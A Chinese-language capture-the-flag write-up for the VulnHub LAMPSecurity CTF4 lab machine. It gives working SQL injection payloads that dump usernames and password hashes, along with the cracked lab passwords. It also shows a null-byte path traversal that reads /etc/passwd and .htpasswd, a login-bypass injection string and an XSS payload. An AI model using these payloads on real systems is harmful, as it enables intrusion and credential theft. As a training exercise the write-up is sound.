[https://www.vulnhub.com/entry/lampsecurity-ctf4,83/](https://www.vulnhub.com/entry/lampsecurity-ctf4,83/)

# 初始操作

下载之后,打开靶机,检查靶机网卡,发现使用的是vm里面的专用网络

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20210718164649.png)

因此将Arch的网卡同样修改成专用网络(或者直接设置成双网卡),对子网进行扫描,确认靶机ip

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20210718165205.png)

靶机ip为`172.16.228.128`,对其进行详细扫描

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20210718165542.png)

`robots.txt`中显示

```
User-agent: *
Disallow: /mail/
Disallow: /restricted/
Disallow: /conf/
Disallow: /sql/
Disallow: /admin/
```

`/conf/`访问报错,`/restricted/`,`/mail/`,`/admin/`都需要登录 

`/sql/`目录可以直接查看,`/sql/db.sql`可以被直接访问,内容如下

```sql
use ehks;
create table user (user_id int not null auto_increment primary key, user_name varchar(20) not null, user_pass varchar(32) not null);
create table blog (blog_id int primary key not null auto_increment, blog_title varchar(255), blog_body text, blog_date datetime not null);
create table comment (comment_id int not null auto_increment primary key, comment_title varchar (50), comment_body text, comment_author varchar(50), comment_url varchar(50), comment_date datetime not null);
```

使用[dirsearch](https://github.com/maurosoria/dirsearch)对网站进行目录扫描,得到`pages`目录可以直接查看

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20210718174307.png)

# sql注入1

进入`blog.php`,报错`Warning: mysql_fetch_row(): supplied argument is not a valid MySQL result resource in /var/www/html/pages/blog.php on line 9`,因此存在报错注入

将`index.html?page=blog&title=Blog&id=2`中的id进行修改,修改成`index.html?page=blog&title=Blog&id=2%27`,会发生报错

`index.html?page=blog&title=Blog&id=2 order by 6-- `会发生报错,说明一共有5个字段

`index.html?page=blog&title=Blog&id=20 union select null,group_concat(cast(schema_name as char)),null,null,null from information_schema.schemata--+`列出数据库的库名

`index.html?page=blog&title=Blog&id=20 union select null,group_concat(cast(table_name as char)),null,null,null from information_schema.tables where table_schema='ehks'--+`列出`ehks`的表

`index.html?page=blog&title=Blog&id=20 union select null,group_concat(cast(column_name as char)),null,null,null from information_schema.columns where table_name='user'--+`列出`ehks.user`的列

`index.html?page=blog&title=Blog&id=20 union select null,null,user_name,null,user_pass from user--+`列出用户名和密码(进行了hash)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20210719220701.png)

密码长度与md5一致,猜测为md5,但不确定是否有加盐,[批量反查结果](https://www.somd5.com/batch.html)如下

```
02e823a15a392b5aa4ff4ccb9060fa68 ilike2surf
b46265f1e7faa3beab09db5c28739380 seventysixers
8f4743c04ed8e5f39166a81f26319bb5 Homesite
7c7bc9f465d86b8164686ebb5151a717 Sue1978
64d1f88b9b276aece4b0edcc25b7a434 pacman
9f3eb3087298ff21843cc4e013cf355f undone1
```

均可进入`/admin/`后台,测试同样可以作为ssh连接并提权到`root`

ssh连接可能会报错`no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1`

解决方法:需要在`/etc/ssh/ssh_config`中添加`KexAlgorithms +diffie-hellman-group1-sha1`然后执行`sudo ssh-keygen -A`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20210719220922.png)

# 路径穿越

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20210718174307.png)

注意到url中的访问格式`index.html?page=blog&title=Blog&id=2`,推测其调用方式为`include($_GET[$page].'.php')`

而`Wappalyzer`的分析结果显示其php版本为5.1.2,因此存在00截断

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20210719230917.png)

`index.html?page=../../../../../../../etc/passwd%00`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20210719232639.png)

对`/restricted/.htaccess`进行读取,`index.html?page=../restricted/.htaccess%00`

```
AuthType Basic
AuthName "Restricted - authentication required"
AuthUserFile /var/www/html/restricted/.htpasswd
Require valid-user
```

对`/restricted/.htpasswd`进行读取,`index.html?page=../restricted/.htpasswd%00`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20210720115742.png)

```
ghighland:8RkVRDjjkJhq6
pmoore:xHaymgB2KxbJU
jdurbin:DPdoXSwmSWpYo
sorzek:z/a8PtVaqxwWg
```

`.htpasswd`的加密方式:[https://httpd.apache.org/docs/current/misc/password_encryptions.html](https://httpd.apache.org/docs/current/misc/password_encryptions.html)


用[https://www.openwall.com/john/](https://www.openwall.com/john/)来进行破解

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20210720143008.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20210720143319.png)

# sql注入2

查看`admin/index.php`的网页源代码,发现其对输入用户名和密码的过滤写在了js中

```js
<script type="text/javascript">
function fixLogin() {
	var test=/[^a-zA-Z0-9]/g;
	document.login_form.username.value=document.login_form.username.value.replace(test, '');
	document.login_form.password.value=document.login_form.password.value.replace(test, '');
}
</script>
```

抓包修改即可,得到报错`select user_id from user where user_name=''' AND user_pass = md5(''')`,说明其闭合方式为`'`

传入`username=' or '1'='1&password=') or 1=1#`,其sql语句为`select user_id from user where user_name='' or '1'='1' AND user_pass = md5('') or 1=1#')`即可登录成功

在post blog界面存在`xss`攻击的可能,传入`</p>xxx<p>`,即可进行闭合,使其中的xxx内容得以执行

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20210720114516.png)